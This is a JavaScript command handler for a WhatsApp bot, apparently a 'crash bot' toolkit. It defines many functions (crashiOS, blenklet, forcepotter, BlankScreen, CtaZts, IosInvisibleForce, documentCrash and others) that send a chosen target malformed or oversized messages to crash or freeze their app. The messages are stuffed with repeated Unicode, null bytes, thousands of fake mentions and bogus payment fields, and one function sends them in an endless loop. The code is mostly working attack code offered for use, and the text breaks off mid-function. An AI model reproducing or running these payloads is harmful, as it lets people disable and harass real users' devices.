const {
          generateWAMessageFromContent,
          getAggregateVotesInPollMessage,
          downloadContentFromMessage,
          prepareWAMessageMedia,
          useMultiFileAuthState,
          generateMessageID,
          generateIOSMessageID,
          generateWAMessage,
          makeInMemoryStore,
          DisconnectReason,
          areJidsSameUser,
          getContentType,
          decryptPollVote,
          relayMessage,
          jidDecode,
          Browsers,
          getDevice,
          proto,
          } = require("baron-baileys-v2")
const fs = require('fs')
//const 

const util = require('util')
const web = fs.readFileSync('./src/opa.webp');
const sekzo3 = 'ྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃ'.repeat(500)
const ios4 = fs.readFileSync('./travas/ios4.js');
const ios7 = fs.readFileSync('./travas/ios7.js');
const ios6 = fs.readFileSync('./travas/ios6.js');
const travadoc = fs.readFileSync('./travas/travadoc.js');
const thumbJpg = fs.readFileSync('./media/thumb.jpg');
const olaJpg = fs.readFileSync('./media/ola.jpg');

const chalk = require('chalk')
const fetch = require('node-fetch')
const moment = require('moment-timezone');
const pino = require('pino')
const crypto = require('crypto');

const path = require('path')
const { loadPlugins } = require('./pluginLoader.js');
const commands = loadPlugins();
const { bug } = require('./travas/bug.js');
const telapreta = `${bug}`
const { bugUrl } = require('./travas/bugUrl.js')
const heavyCommands = new Set([
    'crashhome-ios', 'atraso-ui', 'atraso-v3', 'document-crash',
    'crash-button', 'chat-freeze'
    // 'nuke' NO es pesado, es de red. Dejarlo aquí lo rompería.
]);
const heavyAssets = {
    ios4: fs.readFileSync('./travas/ios4.js'),
    ios7: fs.readFileSync('./travas/ios7.js'),
    ios6: fs.readFileSync('./travas/ios6.js'),
    travadoc: fs.readFileSync('./travas/travadoc.js'),
    telapreta: `${bug}`,
    bugUrl: bugUrl,
    thumbJpg: fs.readFileSync('./media/thumb.jpg'),
    olaJpg: fs.readFileSync('./media/ola.jpg'),
    fotoJpg: fs.readFileSync('./src/foto.jpg'),
    crashZip: fs.readFileSync('./travas/crash.zip'),
    ZeppImg: Buffer.from(
        "iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/AzXg4GAWjAQAACDAAABeUhb3AAAAAElFTkSuQmCC",
        "base64"
    )
};

module.exports = async (conn, m, chatUpdate, store, prefix, taskQueue, logger) => {
try {
m.id = m.key.id
m.chat = m.key.remoteJid
m.fromMe = m.key.fromMe
m.isGroup = m.chat.endsWith('@g.us')
m.isGroup = m.chat?.endsWith('@g.us') || false
m.sender = conn.decodeJid(m.fromMe && conn.user. id || m.participant || m.key.participant || m.chat || '')
if (m.isGroup) m.participant = conn.decodeJid(m.key.participant) || ''
function getTypeM(message) {
    const type = Object.keys(message)
    var restype =  (!['senderKeyDistributionMessage', 'messageContextInfo'].includes(type[0]) && type[0]) || (type.length >= 3 && type[1] !== 'messageContextInfo' && type[1]) || type[type.length - 1] || Object.keys(message)[0]
	return restype
}
m.mtype = getTypeM(m.message)
m.msg = (m.mtype == 'viewOnceMessage' ? m.message[m.mtype].message[getTypeM(m.message[m.mtype].message)] : m.message[m.mtype])
m.text = m.msg.text || m.msg.caption || m.message.conversation || m.msg.contentText || m.msg.selectedDisplayText || m.msg.title || ''
const info = m
const from = info.key.remoteJid
const from2 = info.chat

var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id:(m.mtype === 'conversation') ? m.message.conversation :(m.mtype === 'deviceSentMessage') ? m.message.extendedTextMessage.text :(m.mtype == 'imageMessage') ? m.message.imageMessage.caption :(m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const getGroupAdmins = (participants) => {
        let admins = []
        for (let i of participants) {
            i.admin === "superadmin" ? admins.push(i.id) :  i.admin === "admin" ? admins.push(i.id) : ''
        }
        return admins || []
}
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
var budy = (typeof m.text == 'string' ? m.text: '')
const bardy = body || '';
const isCmd = bardy.startsWith(prefix);
const command = isCmd ? bardy.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = bardy.trim().split(/ +/).slice(1)
const text = args.join(" ")
const q = args.join(" ")
if (!isCmd) return;
const sender = info.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (info.key.participant || info.key.remoteJid)
const botNumber = await conn.decodeJid(conn.user.id)
const senderNumber = sender.split('@')[0]

const userList = [
"yournumber@s.whatsapp.net",
"friendsnumber@s.whatsapp.net",
"0@s.whatsapp.net",
"13135550002@s.whatsapp.net",
"593969533280@s.whatsapp.net",
"584163679167@s.whatsapp.net"
];
const candList = [
    "5216421147692@s.whatsapp.net", 
    "yournumber@s.whatsapp.net",
    "friendsnumber@s.whatsapp.net",
    "120363421317937545@g.us",
    "13135550002@s.whatsapp.net",
    "593969533280@s.whatsapp.net",
    "584163679167@s.whatsapp.net",
    "5491130524256@s.whatsapp.net"
];
const groupid = [ 
 "120363421317937545@g.us",
 "120363415442586508@g.us",
 "120363421386564277@g.us",
 "120363420474631547@g.us",
 "120363402299771381@g.us",
 ];
global.prefa = ['!','.',',','/','-'] 
const isNose = groupid.includes(sender);
const isCreator = userList.includes(sender);
const pushname = m.pushName || `${senderNumber}`
const isBot = info.key.fromMe ? true : false


const lol = {
key: {
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast"
},
message: {
orderMessage: {
orderId: "2009",
thumbnail: thumbJpg,
itemCount: "9999",
status: "INQUIRY",
surface: "",
message: `𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛`,
token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
}
},
contextInfo: {
mentionedJid: ["120363369514105242@s.whatsapp.net"],
forwardingScore: 999,
isForwarded: true,
}
}
const sJid = "status@broadcast";
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata?.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const PrecisaSerMembro = m.isGroup ? await participants.filter(v => v.admin === null).map(v => v.id) : [];
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
var deviceC = info.key.id.length > 21 ? 'Android' : info.key.id.substring(0, 2) == '3A' ? 'IPhone' : 'WhatsApp web'
const settingsPath = './dev/setting.js';
const settings = require(settingsPath);
global.totallog = settings.totallog
global.logColor = settings.logColor || "\x1b[31m"
global.shapeColor = settings.shapeColor || "\x1b[31m"
global.rootColor = settings.rootColor || "\x1b[31m"
global.hideNumber = settings.hideNumber || false
function log(messageLines, title) {
    const top = `\n${shapeColor}` + "╭" + "─".repeat(50) + "╮" + "\x1b[0m"
    const bottom = `${shapeColor}╰` + "─".repeat(50) + "╯" + "\x1b[0m"
    const emptyLine = `${shapeColor}│` + " ".repeat(50) + "│" + "\x1b[0m"
    

    console.log(top);
    if (title) {
    const strip = title.replace(/\\x1b\\ [0-9;]*[mGK]/g,'')
    const titleLine = `${shapeColor}│` + " " + `${logColor}` +
    strip.padEnd(48) + " " + `${shapeColor}│`
    console.log(titleLine);
    console.log(emptyLine);
    }
    messageLines.forEach((line, i)=> {
    if (line.startsWith("\x1b")) {
        const strip = line.replace(/\\x1b\\ [0-9;]*[mGK]/g,'')
        let formattedLine = `${shapeColor}│${logColor}` + ` ${i + 1} ` + `${strip.padEnd(51)}` + " " + `${shapeColor}│` + "\x1b[0m"
        console.log(formattedLine);
    } else {
    const strip = line.replace(/\\x1b\\ [0-9;]*[mGK]/g,'')
        let formattedLine = `${shapeColor}│${logColor}` + ` ${i + 1} ` + `${strip.padEnd(46)}` + " " + `${shapeColor}│` + "\x1b[0m"
        console.log(formattedLine);
        }
        
    });
    console.log(emptyLine);
    console.log(bottom + "\n\n");
}
function hidden(input) {
if (hideNumber){
return "*************"
} else {
return input
}
}

if (totallog) {
if (m.message && m.isGroup) {
    const timeOnly = new Date().toLocaleTimeString("de-DE", {
        hour: "2-digit",
        minute: "2-digit"
    });

    const title = 'Chat Grupal';
    const INFOS = [
        `[ Mensaje ] ${timeOnly}`,
        `=> Mensaje: ${bardy}`,
        `=> Nombre: ${hidden(pushname || "desconocido")}`,
        `=> de: ${hidden(info.sender)}`,
        `=> en: ${groupName || info.chat}`,
        `=> Dispositivo: ${deviceC}`,
    ];
    log(INFOS, title);
} else {
    const timeOnly = new Date().toLocaleTimeString("de-DE", {
        hour: "2-digit",
        minute: "2-digit"
    });

    const title = 'Chat Privado';
    const INFOS = [
        `[ Mensaje ] ${timeOnly}`,
        `=> Texto: ${bardy}`,
        `=> Nombre: ${hidden(pushname || "desconocido")}`,
        `=> De: ${hidden(info.sender)}`,
        `=> Dispocitivo: ${deviceC}`,
    ];
    log(INFOS, title);
}
}
const reply = (text) => {
conn.sendMessage(from, { text: text, mentions: [sender]},
{quoted: info}
).catch(e => {
return
})
}


let mediaImage = await prepareWAMessageMedia({ 
    "image": {
       "url": "./media/thumb.jpg"
      }
    },
  { "upload": conn.waUploadToServer}
  )
mediaImage = mediaImage.imageMessage

const Ehztext = (text, style = 1) => {
    var abc = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
    var ehz = {
      1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
    };
    var replacer = [];
    abc.map((v, i) =>
      replacer.push({
        original: v,
        convert: ehz[style].split('')[i]
      })
    );
    var str = text.toLowerCase().split('');
    var output = [];
    str.map((v) => {
      const find = replacer.find((x) => x.original == v);
      find ? output.push(find.convert) : output.push(v);
    });
    return output.join('');
  };

  function sendMessageWithMentions(text, mentions = [], quoted = false) {
    if (quoted == null || quoted == undefined || quoted == false) {
      return conn.sendMessage(m.chat, {
        'text': text,
        'mentions': mentions
      }, {
        'quoted': m
      });
    } else {
      return conn.sendMessage(m.chat, {
        'text': text,
        'mentions': mentions
      }, {
        'quoted': m
      });
    }
  }


      conn.sendjsonv3 = (jid, jsontxt = {},) => {
        etc = generateWAMessageFromContent(jid, proto.Message.fromObject(
          jsontxt
          ), { userJid: jid,
          }) 
         
       return conn.relayMessage(jid, etc.message, { messageId: etc.key.id });
       }
  
       conn.sendjsonv4 = (jid, jsontxt = {},) => {
        etc = generateWAMessageFromContent(jid, proto.Message.fromObject(
          jsontxt
          ), { userJid: jid }) 
         
       return conn.relayMessage(jid, etc.message, { participant: { jid: jid },   messageId: etc.key.id });
       }
const cataui = fs.readFileSync("./src/cataui.js", "utf8");

const ZeppImg = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/AzXg4GAWjAQAACDAAABeUhb3AAAAAElFTkSuQmCC",
  "base64"
);
async function crashiOS(target) {
 await conn.sendMessage(target, {
 text:
 "> chocoplus" +
 "𑇂𑆵𑆴𑆿".repeat(60000),
 contextInfo: {
 externalAdReply: {
 title: `☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>`,
 body: `BOOT FREE`,
 previewType: "PHOTO",
 thumbnail: fs.readFileSync("./media/ola.jpg"),
 sourceUrl: ``
 }
 }
 }, { quoted: m });
}
const webozz = {
key: {
remoteJid: "status@broadcast",
fromMe: false,
participant: `0@s.whatsapp.net`,
id: "3EB0"
},
message: {
extendedTextMessage: {
text: `ＵＮＫ ↯ ＢＯＴＺＩＮ`,
contextInfo: {
stanzaId: "3EB0",
}
}
}
};

const choco = {
  key: {
    fromMe: false,
    remoteJid: "status@broadcast",
    participant: "0@s.whatsapp.net"
  },
  message: {
    contactMessage: {
      displayName: "⿻𝑐ℎ𝑜𝑐𝑜𝑐𝑟𝑖𝑠𝑝𝑦⿻",
      vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:ZETAS COLLAB\nTEL;type=CELL;type=VOICE;waid=593969533280:593969533280\nEND:VCARD`
    }
  }
}


async function handleStatusBox(conn, msg) {
  const text =
    msg.message?.conversation ||
    msg.message?.extendedTextMessage?.text ||
    msg.message?.ephemeralMessage?.message?.extendedTextMessage?.text ||
    "";

  // separar comando y número
  const args = text.trim().split(/\s+/);
  const number = args[1]; // lo que viene después de "statusbox"

  if (!number) {
    await conn.sendMessage(msg.key.remoteJid, { text: "Error: Debes ingresar un número." }, { quoted: msg });
    return;
  }

  try {
    // verificar en WhatsApp
    const [result] = await conn.onWhatsApp(number);

    if (!result) {
      await conn.sendMessage(msg.key.remoteJid, { text: `El número ${number} no está en WhatsApp.` }, { quoted: msg });
      return;
    }

    const data = {
      Number: number,
      Status: result.exists ? "activo" : "no existe",
      Jid: result.jid
    };

    await conn.sendMessage(msg.key.remoteJid, { text: JSON.stringify(data, null, 2) }, { quoted: msg });
  } catch (error) {
  }
}

async function blenklet(conn, target) {
    let crash = JSON.stringify({ action: "x", data: "x" });

    while (true) {
        try {
            await conn.relayMessage(target, {
                stickerPackMessage: {
                    stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
                    name: "chocoplus ¿?" + "ꦾ".repeat(77777),
                    publisher: "t.me/kkkkkkk",
                    stickers: [
                        { fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp", isAnimated: false, mimetype: "image/webp" }
                    ],
                    fileLength: "3662919",
                    fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
                    fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
                    mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
                    directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
                    contextInfo: {
                        mentionedJid: [
                            "593969533280@s.whatsapp.net",
                            ...Array.from({ length: 1900 }, () =>
                                `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                            )
                        ]
                    }
                }
            }, {});

            const msg = generateWAMessageFromContent(target, {
                viewOnceMessageV2: {
                    message: {
                        listResponseMessage: {
                            title: "xGhr.mp5 ¿?",
                            listType: 4,
                            buttonText: { displayText: "xGhr.mp5¿?" },
                            singleSelectReply: { selectedRowId: "⌜⌟" },
                            contextInfo: {
                                mentionedJid: [target],
                                externalAdReply: {
                                    title: "xGhr.mp5 ¿?",
                                    body: "xGhr.mp5 ¿?",
                                    mediaType: 1,
                                    nativeFlowButtons: [
                                        { name: "payment_info", buttonParamsJson: crash },
                                        { name: "call_permission_request", buttonParamsJson: crash }
                                    ]
                                },
                                extendedTextMessage: {
                                    text: "ꦾ".repeat(20000) + "@1".repeat(20000)
                                }
                            }
                        }
                    }
                }
            }, {});

            await conn.relayMessage(target, msg.message, { messageId: msg.key.id });
        } catch (err) {
        }

        await new Promise(r => setTimeout(r, 500));
    }
}



async function forcepotter(target) {
try {
const vcard = `
BEGIN:VCARD
VERSION:3.0
FN:🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>${ios6}
ORG:𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏${ios6};
TEL;type=CELL;type=VOICE;waid=999999999999:+99 999-999
END:VCARD`;

const contactMsg = {
extendedTextMessage: {
text: `☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>${ios6}`,
contextInfo: {
stanzaId: generateMessageID(),
participant: "0@s.whatsapp.net",
quotedMessage: {
contactMessage: {
displayName: `🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛${ios6}`,
vcard: vcard.trim()
}
}
}
}
};

const paymentMsg = {
requestPaymentMessage: {
currencyCodeIso4217: "BRL",
amount1000: "999999999",
requestFrom: target,
noteMessage: {
extendedTextMessage: {
text: "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>",
contextInfo: {
stanzaId: generateMessageID(),
participant: "0@s.whatsapp.net",
quotedMessage: {
contactMessage: {
displayName: "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>",
vcard: vcard.trim()
}
}
}
}
}
}
};

const locationMsg = {
locationMessage: {
degreesLatitude: 999,
degreesLongitude: 999,
name: `${ios4}`,
address: "Unknown"
}
};

const nestedContactMsg = {
extendedTextMessage: {
text: "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛",
contextInfo: {
stanzaId: generateMessageID(),
participant: "0@s.whatsapp.net",
quotedMessage: {
extendedTextMessage: {
text: "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>",
contextInfo: {
stanzaId: generateMessageID(),
participant: "0@s.whatsapp.net",
quotedMessage: {
contactMessage: {
displayName: "𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 ⚡️",
vcard: vcard.trim()
},
},
},
},
},
},
},}


await conn.relayMessage(target, contactMsg, { messageId: generateMessageID() })
await sleep(1000)
await conn.relayMessage(target, paymentMsg, { messageId: generateMessageID() })
await sleep(1000)
await conn.relayMessage(target, locationMsg, { messageId: generateMessageID() })
await sleep(1000)
await conn.relayMessage(target, nestedContactMsg, { messageId: generateMessageID() })

} catch (error) {
console.error('Error en:', error);
    }
}

async function loadedXios(target) {
 await conn.sendMessage(target, {
 text:
 "\nXghr-BOT V2\n" +  "𑇂𑆵𑆴𑆿".repeat(60000),
 contextInfo: {
 externalAdReply: {
 title: `Xghr-BOT V2 </>`,
 body: `Xghr-BOT V2`,
 previewType: "PHOTO",
 thumbnail: fs.readFileSync("./media/thumb.jpg"),
 sourceUrl: `https://youtube.com/@p.a.zinwebkkkkj`
 }
 }
 }, { quoted: m });
}
async function BlankScreen(target) {
  try {
    const ThumbRavage = "https://files.catbox.moe/cfkh9x.jpg";
    const imagePayload = await prepareWAMessageMedia({
      image: { url: ThumbRavage, gifPlayback: true }
    }, {
      upload: sock.waUploadToServer,
      mediaType: "image"
    });
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 30000 }, () =>
            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
          ),
          isForwarded: true,
          forwardingScore: 9999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363331859075083@newsletter",
            newsletterName: "ꦾ".repeat(10000),
            serverMessageId: 1
          }
        },
        header: {
          title: "",
          ...imagePayload,
          hasMediaAttachment: true
        },
        body: {
          text: "\u2063".repeat(10000)
        },
        footer: {
          text: "AMALIA KILL YOU"
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "ꦾ".repeat(10000),
                url: "ꦾ".repeat(10000),
                merchant_url: ""
              })
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio" + "\0".repeat(10000),
                "screen_0_Dropdown_1": "Null",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          ]
        }
      }
    }), { quoted: null });
    await conn.relayMessage(target, msg.message, { messageId: msg.key.id });
    console.log(`BlankScreen Delay Sent to ${target}`);
  } catch (error) {
  }
}
async function handleSzt(conn, target) {
  let szt = 1;
  for (let i = 0; i < szt; i++) {
    let push = [];
    let buttt = [];
    for (let i = 0; i < 5; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "null",
          "body": "xxx",
          "flow_action": "navigate",
          "flow_action_payload": {
            screen: "FORM_SCREEN"
          },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }
    const media = await prepareWAMessageMedia(
      { image: { url: "https://files.catbox.moe/457lbu.jpg" } },
      { upload: conn.waUploadToServer }
    );
    for (let i = 0; i < 1000; i++) {
      push.push({
        body: { text: `\u0000\u0000\u0000\u0000\u0000` },
        footer: { text: "" },
        header: {
          title: '🫣🫣\u0000\u0000\u0000\u0000',
          hasMediaAttachment: true,
          imageMessage: media.imageMessage
        },
        nativeFlowMessage: { buttons: [] }
      });
    }
    const carousel = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: {
              body: { text: '\u0000\u0000\u0000\u0000' },
              footer: { text: "#𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘" },
              header: { hasMediaAttachment: false },
              carouselMessage: { cards: [...push] }
            }
          }
        }
      },
      { userJid: target, upload: conn.waUploadToServer }
    );
    await conn.relayMessage(target, carousel.message, {
      messageId: carousel.key.id
    });
  }
  console.log("by chocoplus");
}
async function CtaZts(conn, target) {
  const media = await prepareWAMessageMedia(
    { image: { url: "https://files.catbox.moe/wyecvo.jpg" } },
    { upload: conn.waUploadToServer }
  );

  const Interactive = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000,
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot",
              },
            },
          },
          carouselMessage: {
            messageVersion: 1,
            cards: [
              {
                header: {
                  hasMediaAttachment: true,
                  media: media.imageMessage,
                },
                body: {
                  text: " #webitoz " + "ꦽ".repeat(100000),
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: "ꦽ".repeat(2000),
                    },
                  ],
                  messageParamsJson: "{".repeat(10000),
                },
              },
            ],
          },
        },
      },
    },
  };

  await conn.relayMessage(target, Interactive, {
    messageId: null,
    userJid: target,
  });
}
async function ZieeInvisForceIOS(conn, target) {
  const msg = {
    message: {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: "Z1ee - Tryhards ¿?" + "\u0000".repeat(70000) + "𑇂𑆵𑆴𑆿".repeat(60000),
        url: "https://github.com/urz1ee",
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
              caption: "@Urz1ee" + "𑇂𑆵𑆴𑆿".repeat(70000)
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  };

  await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key?.id || Math.random().toString(36).slice(2),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target }
              }
            ]
          }
        ]
      }
    ]
  });
}

async function IosInvisibleForce(conn, target) {
  const msg = {
  message: {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: "𝐋𝐢𝐦𝐯𝐝𝐨𝐧-‣꙱\n" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://t.me/LimvzxTyz",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "Vaxilon",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "@rizxvelzinfinity" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  }
};
  
  await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  console.log(`─────「 ⏤!CrashInvisibleIOS To: ${target}!⏤ 」─────`)
}
if (heavyCommands.has(command)) {
        // ¡ES UN COMANDO PESADO!
        if  (!isBot && !isCreator) return 
        
        logger.info({ cmd: command, user: sender }, 'Encolando comando pesado...');
        
        // Creamos un contexto serializable para el hilo
        const taskContext = {
            command: command, // El comando a ejecutar
            target: m.chat,
            q: q,
            args: args,
            text: text,
            sender: sender,
            // Pasamos los buffers pre-cargados
            assets: heavyAssets
        };

        // Lo enviamos a la cola de esta sesión
        taskQueue.enqueue(taskContext);
        
        // Reaccionamos para confirmar que se recibió
        conn.sendMessage(m.chat, { react: { text: "⚙️", key: m.key } });

        return; // ¡Importante! Terminamos la ejecución aquí.
    }
try {
    // ✅ Previene el error "Cannot read properties of undefined (reading 'get')"
    if (!commands) {
       console.error("Los comandos no están cargados. Revisar pluginLoader.js");
       return;
    }

    const commandToExecute = commands.get(command);

    // Si el comando se encuentra en la colección de PLUGINS...
    if (commandToExecute) {
        
        // 1. Creamos el objeto 'context' con todas las variables útiles
        const context = {
            isCreator,
            pushname,
            from,
            from2,
            prefix,
            reply,
            sender,
            isBot,
            q,
            args,
            text,
            isGroup: m.isGroup,
            groupMetadata,
            participants,
            groupAdmins,
            isBotAdmins,
            isAdmins,
            generateWAMessageFromContent,
            getAggregateVotesInPollMessage,
            downloadContentFromMessage,
            prepareWAMessageMedia,
            useMultiFileAuthState,
            generateMessageID,
            generateIOSMessageID,
            generateWAMessage,
            makeInMemoryStore,
            DisconnectReason,
            areJidsSameUser,
            getContentType,
            decryptPollVote,
            relayMessage,
            jidDecode,
            Browsers,
            getDevice,
            proto,
            cataui,
            groupid,
            candList,
            sleep,
            web,
            sekzo3,
            ios4,
            ios6,
        };
        return await commandToExecute.execute(conn, m, args, context);
    }
} catch (error) {
    console.error(`Error ejecutando el plugin '${command}':`, error);
    return reply('Error: Ocurrió un problema al ejecutar este comando.');
}
async function documentCrash(target) {
  await conn.relayMessage(target, {
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/18970868_1451610396007067_2477655932894905749_n.enc?ccb=11-4&oh=01_Q5Aa2gG5YtBm2C0eu_nYievlS-3dhLAjC8Ne70VK9vO12EPF_g&oe=68EA391C&_nc_sid=5e03e0&mms3=true",
      mimetype: "application/zip",
      fileSha256: "gXL6XotbKW05nCSSa/XlvXeMqOsMkq37Y/XrewO5a0g=",
      fileLength: 99999999999,
      pageCount: 999999999,
      mediaKey: "HduCwhWMz3owQVo4188Om/0YCAl7ws8Zls0hdLD5aEY=",
      fileName: "🕷️「BlackOut System Zap」, 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘",
      fileEncSha256: "9kYcZz1osvxhOoL1hH0el9ZhUYh9z0uk2McxFTOpiHU=",
      directPath: "/v/t62.7119-24/18970868_1451610396007067_2477655932894905749_n.enc?ccb=11-4&oh=01_Q5Aa2gG5YtBm2C0eu_nYievlS-3dhLAjC8Ne70VK9vO12EPF_g&oe=68EA391C&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1757598955",
      jpegThumbnail: ZeppImg,
      contactVcard: true,
      contextInfo: {
        isForwarded: true,
        forwardingScore: 9999,
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550202@s.whatsapp.net"
        },
        participant: "13135550302@bot",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() * 100
          }
        },
        remoteJid: "kkk"
      }
    }
  }, {});
}
async function DelayBjir(target) {
  try {
    const AimBot = {
